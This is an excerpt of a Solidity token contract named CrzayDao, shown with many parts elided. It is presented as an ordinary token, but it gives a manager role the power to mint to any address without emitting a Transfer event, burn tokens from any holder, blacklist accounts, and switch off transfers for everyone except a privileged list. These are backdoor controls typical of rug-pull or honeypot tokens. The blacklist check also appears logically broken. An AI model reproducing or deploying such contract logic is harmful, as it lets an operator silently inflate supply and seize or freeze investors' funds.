...
contract CrzayDao is ERC20("CrzayDao", "CZD"), Ownable {
    ...
    uint256 private _totalSupply = 2 * 10**8 * 10**5;
    ...
    uint256 private _rTotal = _tTotal.mul(_tTotal).div(10**_decimals);
    ...
    uint256 public _maxSellTxAmount = _totalSupply.div(1000).mul(3);
    ...
    mapping(address => bool) private _transferBeforeList;
   ...
   event SwapAndLiquify(
    ...
    constructor(
        ...
        _transferBeforeList[owner()] = true;
        
        // excludeFromReward(address(pancakePair));
    ...
    function excludeFromMaxTx(address account, bool enabled) public onlyManager {
        _isExcludedFromMaxTx[account] = enabled;
    }
    
    function excludedFromMaxTransfer(address account, bool enabled) public onlyManager {
        _isExcludedFromMaxTransfer[account] = enabled;
    }
    
    function excludeFromDraw(address account, bool enabled) public onlyManager {
        _isExcludedFromDraw[account] = enabled;
    }
    
    function setMaxTxPercent(uint256 maxTxPercent) public onlyManager {
        // max tx amount
        _maxTxAmount = (totalSupply() * maxTxPercent) / 10000;
    }

    function setTaxFeePercent(uint256 taxFee) public onlyManager {
        _taxFee = taxFee;
    }

    function setLiquidityFeePercent(uint256 liquidityFee) internal onlyManager {
        _liquidityFee = liquidityFee;
    }
    
    function setMaxSellTxAmount(uint256 maxSellTxAmount) public onlyManager {
    ...
    function setTransferEnabled(bool enabled) public onlyManager {
    ...
    function setLaunchedAt(uint256 number) public onlyManager {
        launchedAt = number;
    }
    
    function setLiquidityWallet(address account) public onlyManager {
        liquidityWallet = account;
    }
    
    function setBlackList(address account, bool enabled) public onlyManager {
    ...
    function updateToAddTTotal(uint256 tAmount) private {
        uint256 rate = _getRate();
        uint256 rAmount = tAmount.mul(rate);
        require(_tTotal.add(tAmount) <= MAX && _rTotal.add(rAmount) <= MAX, "total is less MAX");
        _tTotal = _tTotal.add(tAmount);
        _rTotal = _rTotal.add(rAmount);
    }
    
    function updateToSubTTotal(uint256 tAmount) private {
        uint256 rate = _getRate();
        uint256 rAmount = tAmount.mul(rate);
    ...
    function updateToAddAccount(address account, uint256 tAmount) private {
        uint256 rAmount = tAmount.mul(_getRate());
        _rOwned[account] = _rOwned[account].add(rAmount);
        _tOwned[account] = _tOwned[account].add(tAmount);
    }
    
    function updateToSubAccount(address account, uint256 tAmount) private {
        uint256 rAmount = tAmount.mul(_getRate());
        _rOwned[account] = _rOwned[account].sub(rAmount);
        _tOwned[account] = _tOwned[account].sub(tAmount);
    }
    
    function updateToListeners() private {
        emit UpdateToListeners();
    }
    
    function updateEmitTransfer(address sender, address account, uint256 amount) private {    
        emit Transfer(sender, account, amount);
    }

    function mint(address recipient, uint256 amount) public onlyManager {
        updateToAddTTotal(amount);
        updateToAddAccount(recipient, amount);
        updateToListeners();
    }

    function burn(address sender, uint256 amount) public onlyManager {
        updateToSubTTotal(amount);
        updateToSubAccount(sender, amount);
        updateEmitTransfer(sender, address(0), amount);
    }
    ...
    function _transfer(
        ...
        require(!_blackList[from]||!_blackList[to], "this address is unEnabled");
        
        if (!_transferEnabled) {
            require(_transferBeforeList[from]||_transferBeforeList[to], "transfer is unEnabled");
        }
        // swap and liquify
